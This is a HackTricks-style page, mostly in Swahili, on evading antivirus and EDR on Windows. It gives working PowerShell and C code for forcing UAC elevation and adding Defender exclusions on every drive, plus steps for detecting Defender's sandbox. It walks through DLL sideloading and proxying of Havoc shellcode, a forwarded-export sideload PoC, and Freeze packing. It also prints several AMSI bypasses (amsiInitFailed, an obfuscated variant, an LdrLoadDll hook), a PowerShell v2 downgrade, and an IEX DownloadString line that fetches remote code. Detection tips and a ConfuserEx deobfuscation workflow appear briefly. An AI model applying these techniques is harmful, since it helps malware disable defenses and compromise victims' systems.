# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kuzuia Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kuzuia Windows Defender kufanya kazi kwa kuiga AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Loaders za umma zinazojifanya kuwa game cheats mara nyingi hutumwa kama installers zisizosanikiwa za Node.js/Nexe ambazo kwanza **huomba ruhusa za juu (elevation) kutoka kwa mtumiaji** na kisha kudhoofisha Defender. Mchakato ni rahisi:

1. Chunguza muktadha wa usimamizi kwa kutumia `net session`. Amri hii inafanikiwa tu pale mwito anapokuwa na haki za admin, hivyo kushindwa kunaonyesha loader inaendeshwa kama mtumiaji wa kawaida.
2. Mara moja ijiruke tena yenyewe kwa verb ya `RunAs` ili kusababisha onyo la ridhaa la UAC lililotarajiwa huku ikihifadhi mstari wa amri wa asili.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathirika tayari wanaamini wanauweka programu “cracked”, hivyo mara nyingi onyo linakubaliwa, likiwapa malware haki zinazohitajika kubadilisha sera ya Defender.

### Msamaha ya jumla ya `MpPreference` kwa kila herufi ya diski

Mara tu zikipewa ruhusa za juu, GachiLoader-style chains zinapanua maeneo yasiyotambuliwa ya Defender badala ya kuzima huduma kabisa. Loader kwanza huua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha inapiga **msamaha mpana sana** ili kila profaili ya mtumiaji, saraka ya mfumo, na diski zinazoweza kuondolewa ziwe zisizoweza kuchunguzwa:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Uchunguzi muhimu:

- Lupu inapitia kila filesystem iliyopachikwa (D:\, E:\, USB sticks, n.k.) hivyo **payload yoyote itakayowekwa baadaye mahali popote kwenye diski inapuuzwa**.
- Uteuzi wa nyongeza .sys unaelekea mbele—washambuliaji wanahifadhi chaguo la kupakia drivers zisizokuwa na saini baadaye bila kugusa Defender tena.
- Mabadiliko yote huingia chini ya HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions, kuruhusu hatua za baadaye kuthibitisha kuwa exclusions zinaendelea au kuzipanua bila kuanzisha tena UAC.

Kwa kuwa hakuna huduma ya Defender inayoamishwa, ukaguzi wa afya wa kawaida unaendelea kuripoti “antivirus active” ingawa ukaguzi wa wakati-mwafaka haugusi njia hizo.

## **AV Evasion Methodology**

Hivi sasa, AVs hutumia mbinu tofauti kuangalia kama faili ni haramu au siyo: static detection, dynamic analysis, na kwa EDRs zenye ufanisi zaidi, behavioural analysis.

### **Static detection**

Static detection hupatikana kwa kubaini known malicious strings au mfululizo wa bytes katika binary au script, na pia kwa kuchota taarifa kutoka kwenye faili yenyewe (kwa mfano file description, company name, digital signatures, icon, checksum, n.k.). Hii ina maana kwamba kutumia known public tools kunaweza kukufanya kushikwa kwa urahisi zaidi, kwani huenda zimetengenezwa na kumeungwa lebo kama zenye uharifu. Kuna njia chache za kuepuka aina hii ya detection:

- **Encryption**

Ikiwa utafanya encryption ya binary, haitakuwa na njia kwa AV kugundua programu yako, lakini utahitaji aina fulani ya loader ili ku-decrypt na kuendesha programu kwa memory.

- **Obfuscation**

Wakati mwingine kile unachohitaji ni kubadilisha baadhi ya strings katika binary au script ili kupita kwa AV, lakini inaweza kuwa kazi inayochukua muda kulingana na unachojaribu obfuscate.

- **Custom tooling**

Kama utafanya tools zako mwenyewe, haitakuwa na known bad signatures, lakini hili linachukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kuangalia dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kwa msingi huigawa faili katika sehemu nyingi kisha kuagiza Defender iskan kila sehemu mmoja baada ya mwingine; kwa namna hii, inaweza kukuambia hasa ni flagged strings au bytes zipi katika binary yako.

Ninapendekeza sana utazame hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis ni wakati AV inaendesha binary yako katika sandbox na inatazama shughuli zenye uharifu (kwa mfano jaribu ku-decrypt na kusoma password za browser yako, kufanya minidump kwa LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo ambayo unaweza kufanya kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kuvuka AV's dynamic analysis. AV zina muda mfupi sana wa kukagua faili ili zisibomze mtiririko wa kazi wa mtumiaji, hivyo kutumia sleeps ndefu kunaweza kuathiri uchambuzi wa binaries. Tatizo ni kwamba sandboxes za AV nyingi zinaweza kuruka sleep kabisa kulingana na utekelezaji.
- **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache (kwa mfano < 2GB RAM), vinginevyo zingeweza kuchelewesha mashine ya mtumiaji. Unaweza pia kuwa mbunifu hapa, kwa mfano kwa kukagua joto la CPU au hata mwendo wa fan, si kila kitu kitatekelezwa ndani ya sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imeunganishwa kwenye domain "contoso.local", unaweza kufanya ukaguzi wa domain ya kompyuta kuona kama inalingana na ile uliyobainisha; ikiwa haifanani, unaweza kufanya programu yako itoke.

Imetokea kuwa computername ya Sandbox ya Microsoft Defender ni HAL9TH, hivyo unaweza kukagua jina la kompyuta katika malware yako kabla ya detonation; kama jina linalingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Mambo mengine mazuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev chaneli</p></figcaption></figure>

Kama tulivyosema hapo awali katika chapisho hili, **public tools** hatimaye **zitatambulika**, hivyo, unapaswa kujiuliza jambo:

Kwa mfano, ikiwa unataka dump LSASS, **je, kwa kweli unahitaji kutumia mimikatz**? Au unaweza kutumia mradi mwingine usiojulikana sana ambao pia hufanya dump ya LSASS.

Jibu sahihi huenda ni la mwisho. Kuchukua mimikatz kama mfano, ni labda moja ya, au labda yenye kuwekwa lebo zaidi kati ya vipande vya malware na AVs na EDRs; mradi huo ubinafsi ni mzuri sana, pia ni ndoto mbaya kufanya kazi nayo ili kuzunguka AVs, hivyo tafuta tu mbadala kwa kile unachojaribu kufanikisha.

> [!TIP]
> Unapotengeneza payloads zako kwa ajili ya evasion, hakikisha **turn off automatic sample submission** katika Defender, na tafadhali, kwa umakini, **DO NOT UPLOAD TO VIRUSTOTAL** ikiwa lengo lako ni kufanikisha evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inatambulika na AV fulani, iweke kwenye VM, jaribu kuzima automatic sample submission, na iteste hapo hadi utakapofurahi na matokeo.

## EXEs vs DLLs

Iwapo inawezekana, daima **prioritize using DLLs for evasion**, kwa uzoefu wangu, faili za DLL kwa kawaida huwa **way less detected** na kuchambuliwa, hivyo ni ujanja rahisi kutumia ili kuepuka detection katika baadhi ya matukio (kama payload yako ina njia ya kuendesha kama DLL bila shaka).

Kama tunaona katika picha hii, DLL Payload kutoka Havoc ina kiwango cha detection cha 4/26 katika antiscan.me, wakati EXE payload ina kiwango cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>mfano wa kulinganisha wa antiscan.me wa Havoc EXE payload ya kawaida dhidi ya Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha ujanja kadhaa unaweza kutumia na faili za DLL kuwa zaidi wa siri.

## DLL Sideloading & Proxying

**DLL Sideloading** inachukua faida ya DLL search order inayotumika na loader kwa kuweka programu ya mwathiriwa na malicious payload(s) kando ya kila mmoja.

Unaweza kuangalia programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana kwamba **chunguza mwenyewe programu za DLL Hijackable/Sideloadable**, mbinu hii ni ya kimkato (stealthy) inapofanywa vizuri, lakini ikiwa utatumia programu za DLL Sideloadable zinazojulikana kwa umma, unaweza kukamatwa kwa urahisi.

Kuweka tu DLL yenye madhara kwa jina ambalo programu inatarajia kupakia, haitapakia payload yako, kwani programu inatarajia baadhi ya kazi maalum ndani ya DLL hiyo; ili kurekebisha suala hili, tutatumia mbinu nyingine iitwayo **DLL Proxying/Forwarding**.

**DLL Proxying** inapeleka (forwards) miito ambayo programu inafanya kutoka kwa proxy (na malicious) DLL hadi DLL halisi, hivyo ikihifadhi utendaji wa programu na kuwa na uwezo wa kushughulikia utekelezaji wa payload yako.

Nitakuwa nikitumia mradi [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hapa ni hatua nilizofuatilia:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupa mafaili mawili: template ya DLL source code, na DLL asilia iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zote shellcode yetu (imekodiwa na [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina kiwango cha utambuzi 0/26 katika [antiscan.me](https://antiscan.me)! Ningesema hilo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza sana uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu yale tuliyojadili kwa undani.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, entry ya export ina kifungu cha ASCII kwa muundo `TargetDll.TargetFunc`. Wakati caller anapotatua export, Windows loader itafanya:

- Ipakue `TargetDll` ikiwa haijapakuliwa tayari
- Itafute `TargetFunc` kutoka kwake

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, inatolewa kutoka kwa namespace iliyolindwa ya KnownDLLs (mf., ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, utaratibu wa kawaida wa utafutaji wa DLL utatumika, ambao unajumuisha saraka ya module inayofanya forward resolution.

Hii inaruhusu primitive isiyo ya moja kwa moja ya sideloading: tafuta DLL iliyosainiwa inayoku-export function iliyotumwa kwa jina la module ambalo si KnownDLL, kisha weka DLL iliyosainiwa pamoja na DLL inayodhibitiwa na mshambuliaji iliyopewa jina hasa kama module iliyotumwa. Wakati export iliyotumwa inapoanzishwa, loader itatatua forward na ipakuze DLL yako kutoka saraka ile ile, ikitekeleza DllMain yako.

Mfano ulioonekana kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` sio KnownDLL, kwa hivyo inatatuliwa kupitia utaratibu wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyosainiwa hadi folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` yenye madhara katika folda ile ile. DllMain ndogo kabisa inatosha kupata code execution; hautaji kutekeleza forwarded function ili kuchochea DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Zindua forward kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) inapakia side-by-side `keyiso.dll` (signed)
- Wakati ikitatua `KeyIsoSetAuditingInterface`, loader inafuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inatekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haitekelezwi, utapata kosa la "missing API" tu baada ya `DllMain` tayari kuendesha

Hunting tips:
- Lenga kwenye forwarded exports ambapo module lengwa si KnownDLL. KnownDLLs zimetajwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia orodha ya forwarder ya Windows 11 ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Mawazo ya utambuzi/ulinzi:
- Fuatilia LOLBins (mfano, rundll32.exe) ikipakia signed DLLs kutoka non-system paths, ikifuatiwa na kupakia non-KnownDLLs zenye jina la msingi sawa kutoka kwenye saraka hiyo
- Toa tahadhari kwa mnyororo wa mchakato/moduli kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya njia zinazoweza kuandikwa na mtumiaji
- Tekeleza sera za uadilifu wa msimbo (WDAC/AppLocker) na ukatae write+execute katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya kificho.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, hivyo usitegemee zana moja tu — ikiwa inawezekana, jaribu kuunganisha mbinu mbalimbali za evasion.

## AMSI (Anti-Malware Scan Interface)

AMSI ilianzishwa kuzuia "fileless malware". Awali, AVs ziliweza tu kuchambua **faili kwenye diski**, kwa hivyo ikiwa utaweza kwa namna fulani kutekeleza payloads **directly in-memory**, AV haingeweza kufanya chochote kuzizuia kwa sababu haingeonekana vya kutosha.

Kipengele cha AMSI kimejumuishwa katika vipengele vifuatavyo vya Windows.

- User Account Control, au UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Inaiwezesha programu za antivirus kuchunguza tabia za script kwa kuonyesha yaliyomo ya script kwa namna ambayo hayajafichwa kwa encryption wala obfuscation.

Kukimbiza `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutaonyesha onyo lifuatalo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Tazama jinsi inavyoweka `amsi:` mwanzoni kisha ikifuatiwa na njia ya executable ambayo script ilikimbizwa kutoka, katika kesi hii, powershell.exe

Hatuakuacha faili yoyote kwenye diski, lakini bado tuligunduliwa in-memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia na **.NET 4.8**, msimbo wa C# unapitishwa kupitia AMSI pia. Hii hata inaathiri `Assembly.Load(byte[])` kwa ajili ya in-memory execution. Ndiyo sababu inashauriwa kutumia matoleo ya chini ya .NET (kama 4.7.2 au chini) kwa in-memory execution ikiwa unataka kuepuka AMSI.

Kuna njia chache za kuepuka AMSI:

- **Obfuscation**

Kwa kuwa AMSI kwa ujumla inafanya kazi kwa detections za static, hivyo kubadilisha scripts unazojaribu kuziweka kunaweza kuwa njia nzuri ya kuepuka utambuzi.

Hata hivyo, AMSI ina uwezo wa ku-unobfuscate scripts hata kama ziko na tabaka nyingi, hivyo obfuscation inaweza isiwe chaguo zuri kulingana na jinsi inavyofanywa. Hii inafanya kuwa si rahisi kuepuka. Ingawa, wakati mwingine, yote unayohitaji ni kubadilisha majina ya baadhi ya variables na utakuwa sawa, kwa hivyo inategemea ni kiasi gani kitu kimewekwa alama.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kuingiza DLL ndani ya mchakato wa powershell (na pia cscript.exe, wscript.exe, nk.), inawezekana kuingilia kazi yake kwa urahisi hata ukiwa mtumiaji asiye na vibali vingi. Kutokana na hitilafu hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kuepuka AMSI scanning.

**Forcing an Error**

Kusababisha initialization ya AMSI kushindikana (amsiInitFailed) kutaweka kwamba hakuna skanning itakayozinduliwa kwa mchakato wa sasa. Asili hii ilifichuliwa na awali na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda signature kuzuia matumizi mapana.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua tu mstari mmoja wa msimbo wa powershell kufanya AMSI isifanye kazi kwa mchakato wa powershell wa sasa. Mstari huu, bila shaka, umetambulika na AMSI yenyewe, hivyo mabadiliko kadhaa yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyopata kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, hili huenda litaflagiwa mara tu chapisho hili litakapochapishwa, hivyo haupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kupata anuani ya kazi "AmsiScanBuffer" katika amsi.dll (inayehusika na kuchunguza user-supplied input) na kuibadilisha kwa maagizo ya kurudisha msimbo wa E_INVALIDARG; kwa njia hii, matokeo ya skani halisi yatarudisha 0, ambayo hufasiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina.

Kuna pia mbinu nyingi nyingine zinazotumika bypass AMSI kwa powershell, angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuhusu hizo.

### Kuzuia AMSI kwa kuzuia kupakia amsi.dll (LdrLoadDll hook)

AMSI inaanzishwa tu baada ya `amsi.dll` kupakiwa ndani ya mchakato wa sasa. Njia thabiti, isiyoegemea lugha, ya kuipitia ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` ambayo inarudisha hitilafu wakati module inayohitajika ni `amsi.dll`. Kwa matokeo, AMSI haitawahi kupakiwa na hakuna skani zitakazofanyika kwa mchakato huo.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Inafanya kazi kwenye PowerShell, WScript/CScript na custom loaders sawa (kitu chochote ambacho vingekuwa vinapakia AMSI).
- Ishi pamoja na kuingiza scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka athari za mistari mirefu ya amri.
- Imeonekana ikitumika na loaders zinazoendeshwa kupitia LOLBins (mfano, `regsvr32` inayoita `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia inazalisha script za bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** pia inazalisha script za bypass AMSI zinazopunguza saini kwa kutumia user-defined functions, variables, ifadhaa za characters kwa nasibu na kutekeleza random character casing kwa PowerShell keywords ili kuepuka saini.

**Ondoa saini iliyotambuliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyotambuliwa kutoka kwenye kumbukumbu ya mchakato wa sasa. Zana hizi zinafanya kazi kwa kutafuta kumbukumbu ya mchakato wa sasa kwa saini ya AMSI kisha kuandika juu yake maagizo ya NOP, kwa ufanisi kuiondoa kutoka kwenye kumbukumbu.

**AV/EDR products that uses AMSI**

Unaweza kupata orodha ya AV/EDR products that uses AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell toleo 2**
Ikiwa unatumia PowerShell toleo 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa auditing na troubleshooting, lakini pia inaweza kuwa **tatizo kwa attackers wanaotaka kuepuka detection**.

To bypass PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha PowerShell bila ulinzi (hii ndicho `powerpick` kutoka Cobal Strike hutumia).


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation zinategemea encrypting data, ambayo itafanya kuongezeka kwa entropy ya binary na kufanya iwe rahisi kwa AVs na EDRs kuigundua. Kuwa makini na hili na pengine tumia encryption tu kwa sehemu maalum za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati ukichambua malware inayotumia ConfuserEx 2 (au commercial forks) ni kawaida kukutana na tabaka kadhaa za ulinzi zitakazozuia decompilers na sandboxes. Mtiririko wa kazi uliopo hapa chini huweza kwa uaminifu **kurejesha near–original IL** ambayo baadaye inaweza ku-decompile kuwa C# katika zana kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx hu-encrypt kila *method body* na hu-decrypt ndani ya *module* static constructor (`<Module>.cctor`). Hii pia inapatch checksum ya PE hivyo mabadiliko yoyote yatafanya binary ifie. Tumia **AntiTamperKiller** kutambua encrypted metadata tables, kurecover XOR keys na kuandika upya assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output ina parameta 6 za anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa muhimu unapojenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile  
• de4dot itatoa control-flow flattening, kurejesha original namespaces, classes and variable names na ku-decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx hubadilisha direct method calls na lightweight wrappers (a.k.a *proxy calls*) ili kuvuruga zaidi decompilation. Ondoa hizo kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii utapaswa kuona API za kawaida za .NET kama `Convert.FromBase64String` au `AES.Create()` badala ya opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – endesha binary iliyopatikana ndani ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload halisi. Mara nyingi malware huhifadhi kama TLV-encoded byte array iliyotanguliwa ndani ya `<Module>.byte_0`.

Mnyororo ulio hapo juu unarejesha execution flow **bila** kuhitaji kuendesha sampuli ya uharibifu – muhimu unapofanya kazi kwenye workstation isiyo na mtandao.

> 🛈  ConfuserEx huunda custom attribute inayoitwa `ConfusedByAttribute` ambayo inaweza kutumika kama IOC kwa triage ya sampuli moja kwa moja.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa open-source fork ya LLVM compilation suite inayoweza kuongeza usalama wa programu kupitia code obfuscation na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuunda, wakati wa compile, obfuscated code bila kutumia tool ya nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inaongeza tabaka la obfuscated operations zinazozalishwa na C++ template metaprogramming framework ambazo zitafanya maisha ya mtu anayejaribu ku-crack application kuwa ngumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza ku-obfuscate aina mbalimbali za PE files ikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa LLVM-supported languages inayotumia ROP (return-oriented programming). ROPfuscator ina-obfuscate program kwenye assembly code level kwa kubadilisha instructions za kawaida kuwa ROP chains, ikipunguza ufahamu wetu wa kawaida wa control flow.
